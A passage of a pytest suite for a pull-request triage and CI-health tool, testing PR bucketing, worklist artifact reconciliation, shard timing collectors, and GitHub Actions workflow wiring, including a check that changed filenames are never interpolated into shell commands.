    base = {"number": 0, "bucket": "eligible", "conflict": False,
            "superseded_by": mt.UNKNOWN, "moved_in_window": True}
    items = [dict(base, number=i) for i in range(10)]
    items.append(dict(base, number=10, classification="draft",
                      moved_in_window=False))
    payload = {"items": items, "total_count": 11, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"], require_complete=True) == 2


def test_open_pr_total_pins_the_endpoint(monkeypatch):
    """A `rel=last` from another resource must not be read as the total."""
    def foreign(cmd, **kwargs):
        return SimpleNamespace(
            returncode=0,
            stdout=('HTTP/2.0 200 OK\n'
                    'Link: <https://api.github.com/repositories/9/issues'
                    '?per_page=1&page=7>; rel="last"\n'),
            stderr="")
    monkeypatch.setattr(mt.subprocess, "run", foreign)
    assert mt.open_pr_total() == mt.UNKNOWN

    def ours(cmd, **kwargs):
        return SimpleNamespace(
            returncode=0,
            stdout=('HTTP/2.0 200 OK\n'
                    'Link: <https://api.github.com/repositories/9/pulls'
                    '?state=open&per_page=1&page=164>; rel="last"\n'),
            stderr="")
    monkeypatch.setattr(mt.subprocess, "run", ours)
    assert mt.open_pr_total() == 164

    # A `/pulls?` inside a QUERY VALUE is not the pulls collection, and a
    # `page=` inside a param value is not the pagination page.
    def sneaky(cmd, **kwargs):
        return SimpleNamespace(
            returncode=0,
            stdout=('HTTP/2.0 200 OK\n'
                    'Link: <https://api.github.com/repositories/9/issues'
                    '?x=/pulls?&page=7>; rel="last"\n'
                    'Link: <https://api.github.com/repositories/9/pulls'
                    '?per_page=1&x=/pulls?page=3&page=164>; rel="last"\n'),
            stderr="")
    monkeypatch.setattr(mt.subprocess, "run", sneaky)
    assert mt.open_pr_total() == 164


def test_owner_evidence_absent_is_empty_never_the_author(tmp_path):
    missing = tmp_path / "nope.json"
    assert mt.load_triage_owner_evidence(missing) == {}
    bad = tmp_path / "bad.json"
    bad.write_text("{not json")
    assert mt.load_triage_owner_evidence(bad) == {}
    as_list = tmp_path / "list.json"
    as_list.write_text(_json.dumps(
        [{"number": 7, "owner": "session:abc", "owner_evidence": "branch=x"}]))
    assert mt.load_triage_owner_evidence(as_list)[7]["owner"] == "session:abc"
    as_dict = tmp_path / "dict.json"
    as_dict.write_text(_json.dumps(
        {"8": {"owner": "session:def", "owner_evidence": "branch=y"}}))
    assert mt.load_triage_owner_evidence(as_dict)[8]["owner"] == "session:def"


def test_tool_runs_under_the_documented_system_python3_for_triage():
    """The §11 commands are `python3 tools/…`; a 3.10+-only builtin in the triage
    path crashes at exec — exit 1, the contract's MISS. Exercise it there."""
    py = "/usr/bin/python3"
    if not Path(py).exists():
        pytest.skip("no system python3")
    script = (
        "import sys; sys.path.insert(0, 'tools')\n"
        "import merge_throughput as mt\n"
        "mt.live_main_sha = lambda: 'deadbeef'\n"
        "mt._ensure_object = lambda s: True\n"
        "mt.merge_tree_conflict_detail = lambda *a: (False, [])\n"
        "out = mt.collect_triage_conflicts([{'number': 1, 'head': {'sha': 'a'}}])\n"
        "assert out == {1: (False, [])}, out\n"
        "print('TRIAGE_OK')\n"
    )
    result = subprocess.run([py, "-c", script], capture_output=True, text=True,
                            cwd=ROOT)
    assert result.returncode == 0, result.stderr
    assert "TRIAGE_OK" in result.stdout, result.stdout + result.stderr
    assert "TypeError" not in result.stderr


def test_committed_worklist_validates_and_reconciles():
    # NO skipif: deleting the artifact must FAIL this test, not silently skip it.
    assert WORKLIST_JSON.exists(), "the Task 5 worklist artifact must be committed"
    payload = _json.loads(WORKLIST_JSON.read_text())
    rows = payload["rows"]
    assert payload["total_count"] == len(rows)
    assert payload["bucket_order"] == list(mt.BUCKET_ORDER)
    assert mt.validate_triage_rows(rows, total_count=payload["total_count"]) == []
    counts = {}
    for row in rows:
        counts[row["bucket"]] = counts.get(row["bucket"], 0) + 1
    assert sum(counts.values()) == payload["total_count"]
    assert set(counts) <= set(mt.BUCKET_ORDER)
    assert all(row["owner"] != mt.FLEET_AUTHOR_LOGIN for row in rows)


def test_committed_worklist_findings_are_derivable():
    """Every `findings` value a reader depends on must be recomputable from the
    committed rows/evidence — a curated finding is an unverifiable one."""
    payload = _json.loads(WORKLIST_JSON.read_text())
    rows = payload["rows"]
    findings = payload["findings"]
    paths = {}
    for row in rows:
        if row["bucket"] != "conflicting":
            continue
        for path in row["conflicted_paths"]:
            paths[path] = paths.get(path, 0) + 1
    assert findings["conflict_artifact_paths"] == dict(
        sorted(paths.items(), key=lambda kv: (-kv[1], kv[0])))
    assert findings["conflict_artifact_paths_total"] == sum(paths.values())
    assert findings["conflict_artifact_paths_scope"] == (
        "rows in the conflicting bucket")
    evidence = _json.loads(OWNER_EVIDENCE_JSON.read_text())
    tiers = {}
    for item in evidence:
        tiers[item["tier"]] = tiers.get(item["tier"], 0) + 1
    assert findings["owner_tiers"] == tiers
    assert sum(tiers.values()) == len(rows)
    assert findings["terminal_d5"] == sorted(mt.TERMINAL_D5)
    assert findings["guard_surface_in_d12"] == sorted(mt.HARD_STOP_D12)
    assert findings["dead_weight_evidence"] == {
        str(k): v for k, v in mt.DEAD_WEIGHT_EVIDENCE.items()}
    # A reclassified PR must NOT sit in the bucket it was reclassified out of.
    by_number = {r["number"]: r for r in rows}
    assert by_number[5196]["bucket"] == "conflicting"
    assert 5196 not in mt.TERMINAL_D5
    assert by_number[5460]["bucket"] == "draft"
    assert 5460 not in mt.DEAD_WEIGHT_EVIDENCE
    # The markdown's per-bucket headings must agree with the JSON.
    markdown = WORKLIST_JSON.with_suffix(".md").read_text()
    counts = {}
    for row in rows:
        counts[row["bucket"]] = counts.get(row["bucket"], 0) + 1
    for bucket, count in counts.items():
        assert f"## {bucket} ({count})" in markdown, (bucket, count)
    # Every markdown row cell must equal the JSON row (evidence may be
    # truncated in the table, so it is compared as a PREFIX of the JSON value —
    # a blank or shortened cell is rejected, never silently accepted).
    tier_by_number = {e["number"]: e["tier"] for e in
                      _json.loads(OWNER_EVIDENCE_JSON.read_text())}
    parsed = 0
    for line in markdown.split("\n"):
        match = re.match(r"\| #(\d+) \|", line)
        if not match:
            continue
        parsed += 1
        cells = [c.strip() for c in line.strip().strip("|").split(" | ")]
        number = int(match.group(1))
        row = by_number[number]
        assert cells[2].strip("`") == row["owner"]
        evidence = cells[3]
        assert " *(" in evidence, "the table must carry the tier suffix"
        assert evidence.rstrip().endswith("*")
        tier = evidence[evidence.rindex(" *(") + 3:-2]
        assert tier == tier_by_number[number], (number, tier)
        evidence = evidence[:evidence.rindex(" *(")].rstrip()
        assert evidence, f"row {number}: the markdown evidence cell is empty"
        assert row["owner_evidence"].startswith(evidence.rstrip("…").rstrip("."))
        assert cells[4] == str(row["conflict"])
        assert cells[5] == row["superseded_by"]
        assert cells[6] == str(row["owning_issue"])
    assert parsed == len(rows), "every worklist row must appear in the markdown"
    # And every row must be the row the COMMITTED evidence file produces.
    evidence = {e["number"]: e for e in
                _json.loads(OWNER_EVIDENCE_JSON.read_text())}
    for row in rows:
        assert row["owner"] == (evidence[row["number"]].get("owner")
                                or mt.UNKNOWN)
        assert row["owner_evidence"] == (
            evidence[row["number"]].get("owner_evidence") or mt.UNKNOWN)
        row_surface, row_stale = mt.surface_from_evidence(
            row["surface_evidence"])
        assert row["bucket"] == mt.classify_bucket(
            row["number"], draft=row["draft"], conflict=row["conflict"],
            surface=row_surface, stale=row_stale,
            hard_stop=mt.HARD_STOP_D12, terminal=mt.TERMINAL_D5,
            dead_weight=mt.DEAD_WEIGHT_EVIDENCE)


def test_committed_worklist_carries_the_three_rail_classes():
    """The artifact must bucket the rail's refusal classes, not just the plan's
    ownership taxonomy: a stale GREEN surface is `re_measure`, a red/pending
    surface is `blocked`, and only a fresh green is `eligible`."""
    payload = _json.loads(WORKLIST_JSON.read_text())
    rows = payload["rows"]
    for row in rows:
        surface, stale = mt.surface_from_evidence(row["surface_evidence"])
        assert surface != mt.UNKNOWN, row["number"]
        if row["bucket"] == "re_measure":
            assert surface == mt.SURFACE_GREEN and stale is True, row["number"]
            assert ("base_red_started=" in row["surface_evidence"]
                    or "merge_ref_base=" in row["surface_evidence"])
        if row["bucket"] == "blocked":
            assert surface in (mt.SURFACE_RED, mt.SURFACE_PENDING)
        if row["bucket"] == "eligible":
            assert surface == mt.SURFACE_GREEN and stale is False
    findings = payload["findings"]
    assert findings["re_measure_prs"] == sorted(
        r["number"] for r in rows if r["bucket"] == "re_measure")
    assert findings["blocked_prs"] == sorted(
        r["number"] for r in rows if r["bucket"] == "blocked")
    owned = sum(1 for r in rows
                if r["bucket"] not in ("re_measure", "blocked", "eligible"))
    assert (len(findings["re_measure_prs"]) + len(findings["blocked_prs"])
            + owned == payload["total_count"])


def test_committed_no_languish_records_its_window():
    assert NO_LANG_JSON.exists(), "the S15 snapshot must be committed"
    payload = _json.loads(NO_LANG_JSON.read_text())
    assert payload["read_ok"] is True
    assert payload["incomplete_results"] is False
    assert payload["window_days"] > 0
    assert payload["window_start"] < payload["window_end"]
    assert len(payload["items"]) == payload["total_count"]
    # NOT require_fresh: the artifact is a FROZEN point-in-time snapshot, so a
    # clock-relative freshness gate would make this test fail on a date, not on
    # a code change. The window arithmetic is asserted instead.
    start = datetime.fromisoformat(payload["window_start"].replace("Z", "+00:00"))
    end = datetime.fromisoformat(payload["window_end"].replace("Z", "+00:00"))
    verified = datetime.fromisoformat(payload["verified_at"].replace("Z", "+00:00"))
    assert (end - start).days == payload["window_days"]
    assert end == verified
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"],
                     require_complete=True) == 0


def test_no_languish_rejects_a_flag_that_disagrees_with_the_bucket():
    """A flag on a LOWER-precedence bucket must not hide a languishing PR."""
    row = {"number": 0, "bucket": "eligible", "draft": False,
           "hard_stop": False, "terminal_decision": False,
           "conflict": False, "superseded_by": mt.UNKNOWN,
           "surface_evidence": FRESH_EVIDENCE,
           "moved_in_window": True}
    items = [dict(row, number=i) for i in range(10)]
    items.append(dict(row, number=10, moved_in_window=False, draft=True))
    payload = {"items": items, "total_count": 11, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"], require_complete=True) == 2
    # A HIGHER-precedence bucket may legitimately carry a true flag: a
    # hard_stop row that is ALSO a draft is excluded by its bucket, and the
    # draft flag on it must NOT be rejected as an inconsistency.
    rows = [dict(row, number=i) for i in range(1, 11)]
    hs = dict(row, number=5136, bucket="hard_stop", hard_stop=True,
              draft=True, moved_in_window=False)
    payload2 = {"items": [*rows, hs], "total_count": 11, "read_ok": True,
                "window_days": 7}
    assert run_check("no-languish", json=payload2,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"], require_complete=True) == 0


def test_no_languish_task5_schema_requires_a_window():
    items = [{"number": i, "bucket": "eligible", "draft": False,
              "hard_stop": False, "terminal_decision": False,
              "conflict": False, "moved_in_window": True} for i in range(11)]
    payload = {"items": items, "total_count": 11, "read_ok": True}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"], require_complete=True) == 2


def test_no_languish_refuses_a_label_that_is_not_the_first_match():
    """The exclusion label is self-declared; it must BE the first match."""
    liars = [{"number": 0, "bucket": "eligible", "draft": False,
              "hard_stop": False, "terminal_decision": False,
              "conflict": False, "moved_in_window": True} for _ in range(11)]
    liars.append({"number": 99, "bucket": "draft", "draft": False,
                  "hard_stop": False, "terminal_decision": False,
                  "conflict": False, "moved_in_window": False})
    payload = {"items": liars, "total_count": 12, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"], require_complete=True) == 2


def test_no_languish_allows_overlapping_superseded_by_on_a_higher_bucket():
    """A hard_stop row may also carry dead-weight evidence; it is still
    excluded by its own bucket, and the marker must not refuse the record."""
    rows = [{"number": i, "bucket": "eligible", "draft": False,
             "hard_stop": False, "terminal_decision": False,
             "conflict": False, "superseded_by": mt.UNKNOWN,
             "surface_evidence": FRESH_EVIDENCE,
             "moved_in_window": True} for i in range(1, 11)]
    rows.append({"number": 5136, "bucket": "hard_stop", "draft": False,
                 "hard_stop": True, "terminal_decision": False,
                 "conflict": False, "superseded_by": "#3405 (landed)",
                 "moved_in_window": False})
    payload = {"items": rows, "total_count": 11, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"], require_complete=True) == 0


def test_committed_no_languish_snapshot_matches_the_worklist():
    """The S15 snapshot must be the worklist rows plus `moved_in_window` — a
    hand-edited `bucket` in the snapshot is otherwise invisible."""
    worklist = {r["number"]: r for r in
                _json.loads(WORKLIST_JSON.read_text())["rows"]}
    snapshot = _json.loads(NO_LANG_JSON.read_text())["items"]
    assert len(snapshot) == len(worklist)
    for item in snapshot:
        row = worklist[item["number"]]
        assert isinstance(item.get("moved_in_window"), bool)
        for key, value in row.items():
            assert item[key] == value, (item["number"], key)


def test_no_languish_superseded_by_outside_dead_weight_is_2():
    """`superseded_by` on a bucket that FOLLOWS dead_weight is inconsistent:
    the row's first match should have been dead_weight."""
    items = [{"number": i, "bucket": "eligible", "draft": False,
              "hard_stop": False, "terminal_decision": False,
              "conflict": False, "moved_in_window": False,
              "superseded_by": mt.UNKNOWN} for i in range(11)]
    items.append({"number": 11, "bucket": "eligible", "draft": False,
                  "hard_stop": False, "terminal_decision": False,
                  "conflict": False, "moved_in_window": False,
                  "superseded_by": "a total lie: landed in #0"})
    payload = {"items": items, "total_count": 12, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload, exclude=["superseded_by"],
                     require_complete=True) == 2


def test_no_languish_nonpositive_window_days_is_2():
    payload = _languish_payload(0)
    payload["window_days"] = 0
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"],
                     require_complete=True) == 2


def test_merge_tree_conflict_detail_parses_paths_and_never_prose():
    """The conflicted paths are lines[1:] up to the first blank line."""
    def fake_run(cmd, **kwargs):
        if cmd[:2] == ["git", "rev-parse"]:
            return SimpleNamespace(returncode=0, stdout="sha\n", stderr="")
        assert cmd[:2] == ["git", "merge-tree"], cmd
        return SimpleNamespace(returncode=1, stdout=(
            "treeoid\n"
            "config/ci-surfaces.yml\n"
            "tools/ci_selection.py\n"
            "\n"
            "Auto-merging config/ci-surfaces.yml\n"
            "CONFLICT (content): Merge conflict in config/ci-surfaces.yml\n"
        ), stderr="")

    monkeypatch = pytest.MonkeyPatch()
    monkeypatch.setattr(mt.subprocess, "run", fake_run)
    try:
        conflict, paths = mt.merge_tree_conflict_detail(ROOT, "main", "branch")
    finally:
        monkeypatch.undo()
    assert conflict is True
    assert paths == ["config/ci-surfaces.yml", "tools/ci_selection.py"]


def test_merge_tree_conflict_detail_clean_and_unknown():
    def clean_run(cmd, **kwargs):
        if cmd[:2] == ["git", "rev-parse"]:
            return SimpleNamespace(returncode=0, stdout="sha\n", stderr="")
        return SimpleNamespace(returncode=0, stdout="treeoid\n", stderr="")

    monkeypatch = pytest.MonkeyPatch()
    monkeypatch.setattr(mt.subprocess, "run", clean_run)
    try:
        assert mt.merge_tree_conflict_detail(ROOT, "main", "branch") == (False, [])
    finally:
        monkeypatch.undo()

    def missing_run(cmd, **kwargs):
        return SimpleNamespace(returncode=1, stdout="", stderr="no ref")

    monkeypatch.setattr(mt.subprocess, "run", missing_run)
    try:
        # A missing ref is UNKNOWN, never "no conflict".
        assert mt.merge_tree_conflict_detail(ROOT, "main", "branch") == (
            mt.UNKNOWN, [])
    finally:
        monkeypatch.undo()


def test_5196_is_conflicting_not_terminal():
    """The plan's E5 claim that #5196 asserts the opposite contract does not
    reproduce: its own body places the state on `:Source` (what main says)."""
    row = mt.build_triage_row(_pr(5196, branch="feat/3998-raw-absent-state"),
                              conflict=True)
    assert row["bucket"] == "conflicting"
    assert row["terminal_decision"] is False


def test_cli_triage_live_emits_the_reconcilable_envelope(monkeypatch, capsys):
    """`--triage` (no --emit) must reconcile against the ENUMERATION total."""
    prs = [{"number": i, "draft": False, "title": f"x (#{i})",
            "head": {"ref": f"fix/{i}-x"}} for i in range(1, 13)]
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: prs)
    monkeypatch.setattr(mt, "collect_triage_conflicts",
                        lambda *a, **k: {i: (False, []) for i in range(1, 13)})
    monkeypatch.setattr(mt, "collect_triage_stale_surface",
                        lambda *a, **k: {i: FRESH_EVIDENCE for i in range(1, 13)})
    monkeypatch.setattr(mt, "open_pr_total", lambda: 12)
    monkeypatch.setattr(mt, "load_triage_owner_evidence", lambda *a, **k: {})
    assert mt._cli_triage([]) == 0
    payload = _json.loads(capsys.readouterr().out)
    assert payload["total_count"] == 12
    assert payload["bucket_order"] == list(mt.BUCKET_ORDER)
    assert all(r["bucket"] == "eligible" for r in payload["rows"])


def test_cli_triage_refuses_a_failed_conflict_sweep_through_main(monkeypatch):
    prs = [{"number": i, "draft": False, "title": f"x (#{i})",
            "head": {"ref": f"fix/{i}-x"}} for i in range(1, 13)]
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: prs)
    monkeypatch.setattr(mt, "collect_triage_conflicts", lambda *a, **k: None)
    assert mt._cli_triage([]) == 2


# ---------------------------------------------------------------------------
# Task 4b (#5215 M8): live shard-balance + durations-map collectors.
#
# The instrument already owns the exit-code contract for these checks; these
# tests pin the DATA SOURCE — `shard-balance` is observed Jobs-API wall time
# (never the map), `durations-map`'s age comes from `durations_captured_at`, and
# an absent collector observation is UNKNOWN, never "no divergence".
# ---------------------------------------------------------------------------


def test_job_wall_seconds_defers_to_the_jobs_api_timestamps():
    assert mt._job_wall_seconds({
        "started_at": "2026-09-27T16:00:00Z",
        "completed_at": "2026-09-27T16:01:00Z",
    }) == 60.0
    assert mt._job_wall_seconds({"started_at": None, "completed_at": None}) is None


def test_collect_shard_balance_uses_observed_wall_time(monkeypatch):
    import ci_timing

    # #6135: the collector refuses a family that is not the CONFIGURED shard
    # set, so this unit test states the set it is exercising (two legs) rather
    # than depending on the repo's current `fast_shards`.
    monkeypatch.setattr(mt, "_configured_shard_set", lambda: {"a", "b"})
    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
        {"name": "test (a)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:36:30Z"},
        {"name": "test (b)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:26:47Z"},
    ])
    payload = mt.collect_shard_balance()
    assert payload["legs"]["a"]["wall_seconds"] == 2190.0
    assert payload["legs"]["b"]["wall_seconds"] == 1607.0
    # the observed split is 9.72 min — NOT the map's 0.00 min
    assert round(payload["shard_imbalance_minutes"], 2) == 9.72
    assert mt.run_check("shard-balance", json=payload, max=3) == 1


def test_collect_shard_balance_requires_both_legs(monkeypatch):
    import ci_timing

    monkeypatch.setattr(mt, "_configured_shard_set", lambda: {"a", "b"})
    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
        {"name": "test (a)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:36:30Z"},
    ])
    assert mt.collect_shard_balance() == {}


def test_collect_shard_balance_refuses_a_partial_family(monkeypatch):
    """#6135: a truncated Jobs-API read must be UNKNOWN, not a measurement
    taken over 2 of the configured 9 shards (that under-reports max(shard))."""
    import ci_timing

    monkeypatch.setattr(mt, "_configured_shard_set", lambda: set("abcdefghi"))
    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
        {"name": "test (a)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:36:30Z"},
        {"name": "test (b)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:26:47Z"},
    ])
    assert mt.collect_shard_balance() == {}


def test_collect_shard_balance_fails_closed_when_config_is_unreadable(monkeypatch):
    """#6135: an UNREADABLE config must not skip the completeness check — that
    would measure whatever page of jobs was fetched and under-report max(shard)
    in exactly the degraded environment the guard exists for."""
    import ci_timing

    monkeypatch.setattr(mt, "_configured_shard_set", lambda: None)
    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
        {"name": "test (a)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:36:30Z"},
        {"name": "test (b)", "conclusion": "success",
         "started_at": "2026-09-27T16:00:00Z",
         "completed_at": "2026-09-27T16:26:47Z"},
    ])
    assert mt.collect_shard_balance() == {}


def test_shard_balance_check_requires_every_observed_leg_green():
    """#6135: the check must not validate two of nine shards. A 9-leg payload
    with a red shard outside a/b is a coverage failure, not a pass."""
    def leg(c):
        return {"conclusion": c, "wall_seconds": 300.0}
    nine = {ch: leg("success") for ch in "abcdefghi"}
    ok = {"shard_imbalance_minutes": 0.0, "legs": nine}
    assert mt.run_check("shard-balance", json=ok, max=3) == 0
    red_i = dict(ok, legs=dict(nine, i=leg("failure")))
    assert mt.run_check("shard-balance", json=red_i, max=3) == 2
    red_c = dict(ok, legs=dict(nine, c=leg("skipped")))
    assert mt.run_check("shard-balance", json=red_c, max=3) == 2


def test_diverged_duration_keys_flags_only_observed_overshoot():
    durations = {"test_a.py": 10.0, "test_b.py": 100.0, "test_c.py": 5.0}
    observed = {"test_a.py": 12.0, "test_b.py": 40.0}  # test_c not observed
    assert mt._diverged_duration_keys(durations, observed) == ["test_b.py"]


def test_collect_durations_map_reports_age_and_divergence(monkeypatch):
    import ci_selection

    now = mt.datetime.now(mt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    monkeypatch.setattr(ci_selection, "load_manifest", lambda: {
        "surfaces": {"core": ["test_a.py"]},
        "durations": {"test_a.py": 10.0},
        "durations_captured_at": now,
    })
    monkeypatch.setattr(mt, "_collector_observed_weights",
                        lambda: {"test_a.py": 12.0})
    payload = mt.collect_durations_map()
    assert payload["durations_map"]["sampled_keys"] == 1
    assert payload["durations_map"]["compared_keys"] == 1
    assert 0 <= payload["durations_map"]["age_days"] < 0.01
    assert payload["diverged"] == []
    assert mt.run_check("durations-map", json=payload, max_age_days=14) == 0


def test_collect_durations_map_absent_capture_age_is_unknown(monkeypatch):
    import ci_selection

    monkeypatch.setattr(ci_selection, "load_manifest", lambda: {
        "surfaces": {"core": ["test_a.py"]},
        "durations": {"test_a.py": 10.0},
    })
    monkeypatch.setattr(mt, "_collector_observed_weights", lambda: None)
    payload = mt.collect_durations_map()
    assert payload["durations_map"]["age_days"] is mt.UNKNOWN
    assert "diverged" not in payload, "an absent comparison must not read as clean"
    assert mt.run_check("durations-map", json=payload, max_age_days=14) == 2


def test_collect_durations_map_disjoint_keys_is_unknown(monkeypatch):
    """A non-empty observation that shares NO basename with the map compared
    ZERO keys; `diverged: []` would read as `0` — a false green on an
    unobserved read."""
    import ci_selection

    now = mt.datetime.now(mt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    monkeypatch.setattr(ci_selection, "load_manifest", lambda: {
        "surfaces": {"core": ["test_a.py"]},
        "durations": {"test_a.py": 10.0},
        "durations_captured_at": now,
    })
    monkeypatch.setattr(mt, "_collector_observed_weights",
                        lambda: {"test_other.py": 10.0})
    payload = mt.collect_durations_map()
    assert payload["durations_map"]["compared_keys"] == 0
    assert "diverged" not in payload
    assert mt.run_check("durations-map", json=payload, max_age_days=14) == 2


# ---------------------------------------------------------------------------
# Task 8 (#5215 D13) — the main-health signal for the five pull_request-only
# required contexts. Spec: plan §10 Task 8.
#
# These pin the WIRING (the deliverable) by parsing the workflow files: a
# check-run can only appear on `main` for a required context if ci.yml is
# callable and the job still answers to the context's name. They are hermetic
# (YAML + the module's own map), never a live read.
# ---------------------------------------------------------------------------

FIVE_MAIN_HEALTH_CONTEXTS = [
    "pricing-artifact",
    "docs",
    "test-isolation",
    "license-surface",
    "legal-e2e",
]
WORKFLOWS_DIR = ROOT / ".github" / "workflows"


def _load_workflow(name):
    import yaml  # third-party, not in the module's stdlib-only import set

    return yaml.safe_load((WORKFLOWS_DIR / name).read_text())


def _on_block(workflow):
    # PyYAML reads the bare `on:` key as the boolean True.
    return workflow.get(True) if True in workflow else workflow.get("on")


def test_main_health_context_mapping_pins_the_real_reusable_name_shape():
    # GitHub names a reusable workflow's check runs `<caller job> / <called
    # job>` — verified live in this repo on `dashboard-js-tests`' node-ci call
    # (`dashboard-js-tests / unit-test`). The nightly emits `main-health / docs`,
    # NOT a bare `docs`; the mapping must resolve the prefixed shape.
    for ctx in FIVE_MAIN_HEALTH_CONTEXTS:
        assert mt.main_health_context(f"{mt.MAIN_HEALTH_CALLER} / {ctx}") == ctx
    # Negative control: an unknown called job is NOT silently mapped to a
    # context — it stays NO_MAIN_SIGNAL under its real name.
    unknown = f"{mt.MAIN_HEALTH_CALLER} / not-a-context"
    assert mt.main_health_context(unknown) == unknown
    # A bare name still resolves (non-reusable shape unchanged).
    assert mt.main_health_context("docs") == "docs"


def test_main_health_caller_matches_the_nightly_workflow_job():
    """The prefix constant must track the caller job's effective name."""
    jobs = _load_workflow("main-health-nightly.yml")["jobs"]
    assert "main-health" in jobs, "the caller job id must be `main-health`"
    job = jobs["main-health"]
    # Both the job id and its (optional) `name:` are the GitHub prefix source;
    # pin both so a rename of either cannot silently re-break the mapping.
    assert (job.get("name") or "main-health") == mt.MAIN_HEALTH_CALLER
    assert mt.MAIN_HEALTH_CALLER == "main-health"


def test_strict_main_gate_resolves_the_prefixed_main_health_name(monkeypatch):
    """Discriminating: the shape the reusable call actually emits resolves.

    Required `pricing-artifact`, run `main-health / pricing-artifact`: without
    the prefix-strip this is NO_MAIN_SIGNAL and (no observed success) exit 2.
    """
    prefixed = f"{mt.MAIN_HEALTH_CALLER} / pricing-artifact"
    payload = _gate([_gcheck(prefixed, "success")], ["pricing-artifact"])
    assert run_check("main-gate", json=payload, strict=True) == 0
    # Control: neutralise the mapping and the same run is excluded → 2.
    monkeypatch.setattr(mt, "MAIN_HEALTH_JOB_ID_TO_CONTEXT", {})
    monkeypatch.setattr(mt, "MAIN_HEALTH_CALLER", "no-such-caller")
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_ci_yml_declares_the_main_health_workflow_call_input():
    on = _on_block(_load_workflow("ci.yml"))
    assert "pull_request" in on, "the PR trigger must remain"
    call = on.get("workflow_call")
    assert isinstance(call, dict), "ci.yml must be callable (Task 8)"
    spec = call.get("inputs", {}).get("main_health")
    assert isinstance(spec, dict)
    assert spec.get("type") == "boolean"
    assert spec.get("default") is False


def test_the_five_required_jobs_always_run_and_are_not_name_shadowed():
    jobs = _load_workflow("ci.yml")["jobs"]
    for ctx in FIVE_MAIN_HEALTH_CONTEXTS:
        job = jobs.get(ctx)
        assert job is not None, f"{ctx} is not a job in ci.yml"
        # A required job that is `needs:`/`if:`-gated can be SKIPPED, and a
        # skipped required job reports SUCCESS (#2055) — a green signal that
        # never ran. The main-health call relies on these always running.
        assert "needs" not in job, f"{ctx} must not be needs-gated"
        assert "if" not in job, f"{ctx} must not be if-gated"
        # A `name:` changes the emitted check-run name away from the required
        # context (emitter-map rule: `name` wins over job id).
        assert job.get("name") in (None, ctx), (
            f"{ctx} carries name={job.get('name')!r}; the check-run would not "
            f"be named {ctx!r}"
        )


def test_changes_job_honours_main_health():
    changes = _load_workflow("ci.yml")["jobs"]["changes"]
    step = next(s for s in changes["steps"] if s.get("id") == "gate")
    run = step["run"]
    assert "inputs.main_health" in run, "changes must short-circuit main_health"
    assert "exit 0" in run


def test_docs_job_main_health_uses_a_safe_post_merge_gate():
    steps = _load_workflow("ci.yml")["jobs"]["docs"]["steps"]
    checkouts = [
        s for s in steps if str(s.get("uses", "")).startswith("actions/checkout")
    ]
    assert any(s.get("with", {}).get("fetch-depth") == 0 for s in checkouts), (
        "the main_health checkout must set fetch-depth: 0"
    )
    # The PR path must be inert under main_health (there is no PR base on a
    # schedule, and #2386's fail-closed check would otherwise red the nightly).
    changed = next(s for s in steps if s.get("id") == "changed")
    assert "main_health" in changed.get("if", "")
    mh = next(s for s in steps if s.get("id") == "changed_mh")
    assert "main_health" in mh.get("if", "")
    assert "HEAD^" in mh["run"]
    # A deleted/renamed-away .md path does not exist on disk and lychee
    # hard-errors on a nonexistent input — the list must be AC(M)R only.
    assert "--diff-filter" in mh["run"] and "ACMR" in mh["run"]
    # Filenames are PR-author-controlled: they must never be interpolated into a
    # shell command (#4449). markdownlint consumes them as ARGV; lychee reads a
    # FILE — neither via `${{ ... }}` text expansion.
    lint = next(
        s for s in steps if str(s.get("name", "")).startswith("Markdownlint (main health")
    )
    assert "xargs -0" in lint["run"]
    assert "${{ steps.changed_mh" not in lint["run"]
    link = next(
        s for s in steps if str(s.get("name", "")).startswith("Link check (main health")
    )
    assert "--files-from" in link["with"]["args"]
    assert "${{ steps.changed_mh" not in link["with"]["args"]
    # A link-free markdown file is legitimate: the action's failIfEmpty default
    # (true) would red the nightly on common prose-only commits.
    assert link["with"].get("failIfEmpty") is False


def test_docs_job_pr_path_never_interpolates_filenames():
    """#4449: the PR path's changed-markdown list is DATA, never shell text.

    The main-health path was fixed and pinned by
    ``test_docs_job_main_health_uses_a_safe_post_merge_gate``. The PR path kept
